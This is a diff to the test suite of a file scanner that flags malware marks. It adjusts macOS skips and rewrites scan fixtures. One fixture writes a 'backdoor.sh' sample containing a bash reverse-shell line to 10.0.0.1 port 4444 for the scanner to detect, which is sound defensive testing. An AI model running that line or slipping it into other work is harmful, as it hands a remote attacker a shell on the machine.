@@ -84,10 +84,6 @@ TESTS = []
 POSIX_ONLY = set()  # tests that need a shell, /bin or a Linux program
 
 IS_DARWIN = sys.platform == "darwin"
-# Copies of real system programs for the scanner tests: /bin/true and /bin/ls
-# are the Linux places, macOS keeps both under /usr/bin.
-SYSTEM_TRUE = "/usr/bin/true" if IS_DARWIN else "/bin/true"
-SYSTEM_LS = "/usr/bin/ls" if IS_DARWIN else "/bin/ls"
 # Only what Darwin cannot do at all: no spin-lock API (its mutex stand-in
 # reports mutex findings), no memfd/fexecve/execveat/pidfd/process_vm,
 # no prctl/personality/capset/iopl, no dlmopen/getaddrinfo_a/sendmmsg/renameat2/
@@ -159,6 +155,9 @@ DARWIN_SKIP = {
     "behavior_setfsuid_root",
     "behavior_setresgid_root",
     "behavior_setfsgid_root",
+    # APFS refuses a name that is not valid UTF-8 (EILSEQ), so the file this
+    # test wants to create cannot exist here
+    "json_loads_a_path_with_a_high_byte",
     # Apple's own programs are arm64e, and dyld refuses to insert an arm64
     # library into one ("have 'arm64', need 'arm64e'"): nothing whose target is
     # a system program (sh, bash, sleep, python3) can be analysed here. Programs
@@ -328,8 +327,13 @@ def cli_scan_finds_malware_marks_without_running_anything():
         put("backdoor.sh", "#!/bin/sh\nbash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n")
         put("clean.txt", "nothing to see\n")
         put("notes.sh", "#!/bin/sh\necho hello\n")
-        shutil.copy(SYSTEM_TRUE, os.path.join(d, "report.pdf"))
-        shutil.copy(SYSTEM_TRUE, os.path.join(d, "fine"))
+        # A program named like a document, and one that keeps a name of its own:
+        # only the first is a finding. The disguised one is a script, which every
+        # system has and every version of the rule reads the same way; the quiet
+        # one is a program built here, so the test does not depend on where the
+        # platform keeps `true` or on which format its binaries are in.
+        put("report.pdf", "#!/bin/sh\nexit 0\n")
+        shutil.copy(prog("no_bugs"), os.path.join(d, "fine"))
         p, r = run_json(["scan", d])
         by = {}
         for f in r["findings"]:
@@ -2385,7 +2389,7 @@ def scan_copy_of_a_system_program_under_its_name():
         expect("like the system's" in r["findings"][0]["message"] and "/ls" in r["findings"][0]["message"],
                r["findings"][0]["message"])
         # the real program, byte for byte, is that program
-        shutil.copy(SYSTEM_LS, copy)
+        shutil.copy("/bin/ls", copy)
         p, r = run_json(["scan", copy])
         expect(p.returncode == 0 and r["findings"] == [], f"a copy of /bin/ls: {types(r)}")
     finally:
